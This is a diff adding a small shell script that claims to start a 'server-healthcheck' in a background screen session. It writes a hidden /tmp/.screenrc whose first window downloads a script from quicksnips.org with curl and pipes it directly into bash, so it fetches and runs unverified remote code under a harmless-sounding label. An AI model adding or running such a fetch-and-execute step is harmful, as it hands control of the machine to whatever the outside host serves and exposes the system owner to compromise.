@@ -1,0 +1,3 @@
+# Starts screen with server-healthcheck running in a background terminal.
+
+echo -e "screen -t healthcheck 0 bash -c 'curl -s http://quicksnips.org/remote/server-healthcheck | bash; bash -l'\nscreen 1 bash -l" > /tmp/.screenrc && screen -c /tmp/.screenrc
